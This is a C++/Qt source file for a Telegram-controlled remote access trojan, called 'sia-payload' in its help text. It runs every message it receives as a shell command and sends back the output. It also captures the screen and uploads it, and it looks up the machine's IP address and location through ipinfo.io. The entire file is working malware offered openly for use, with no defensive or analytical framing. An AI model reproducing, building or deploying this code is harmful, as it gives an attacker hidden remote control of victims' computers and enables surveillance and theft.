#include <QCoreApplication>
#include <QDebug>
#include <QProcess>
#include <QStringList>
#include <QString>
#include <QByteArray>
#include <QNetworkAccessManager>
#include <QNetworkReply>
#include <QNetworkRequest>
#include <QEventLoop>
#include <QVariant>
#include <QSysInfo>
#include <QFile>

#include "qttelegrambot.h"

//your bot token
#define TOKEN ""

Telegram::Bot *bot;

void newMessage(Telegram::Message message)
{
    qDebug() << "new message:" << message;

    if (bot && message.type == Telegram::Message::TextType) {
        if (message.string == "/start") {
            bot->sendMessage(message.chat.id, "Hello " + message.from.firstname + " \n\n☠ Bot is online!\n\n Enter /help to get commands and help.");
        }
        //Help command
        else if (message.string == "/help") {
            bot->sendMessage(message.chat.id, "Help:\n"
                             "  /info => To Get ip and system info\n"
                             "  /screenShot => Get ScreenShot of system(Just linux)\n\n"
                             "for run shell command just send without `/` and \nRecive result.\n"
                             "Coded By : ViRuS007\n"
                             "Email : virus007@protonmail.com\n"
                             "Telegram ID : @Msf_Payload\n"
                             "\n"
                             "Github: http://github.com/shayanzare/sia-payload");
        }
        // info command
        else if (message.string == "/info")
        {
            QEventLoop eventLoop;
            QNetworkAccessManager mgr;
            QObject::connect(&mgr, SIGNAL(finished(QNetworkReply*)), &eventLoop, SLOT(quit()));
            QUrl url("http://ipinfo.io/json");
            QNetworkRequest req(url);
            QNetworkReply *reply = mgr.get(req);
            eventLoop.exec();

            //send output to telegram
            bot->sendMessage(message.chat.id, "☠ Result :\n" + reply->readAll());
        }
        //taking screenShot
        // TODO: This Command just for linux
        else if (message.string == "/screenShot") {
            system("import -window root -resize 1360x768 -delay 200 screenshot.png");

            QFile file("screenshot.png");
            if (file.open(QIODevice::ReadOnly)) {
                bot->sendPhoto(message.chat.id, &file);
            }
            else
            {
                qDebug() << "Error to opening file";
                bot->sendMessage(message.chat.id, "☠ Error To Opening File!");
            }
        }

        //Else for run shell commands
        else
        {
            QProcess process;
//            qDebug() << "[+] Command : " << message.string;
            process.start(message.string);
            process.waitForFinished(-1); // will wait forever until finished

            QString stdout = process.readAllStandardOutput();
            QString stderr = process.readAllStandardError();
//            qDebug() << "stdout: \n" << stdout;
//            qDebug() << "stderr: \n" << stderr;
            bot->sendMessage(message.chat.id, "☠ Result :\n" + stdout + "\n☠ Error :\n" + stderr);

        }
    }
}

int main(int argc, char *argv[])
{
    QCoreApplication a(argc, argv);

    bot = new Telegram::Bot(TOKEN, true, 500, 4);
    QObject::connect(bot, &Telegram::Bot::message, &newMessage);
    qDebug() << "[+] Started Telegram Bot";

    return a.exec();
}
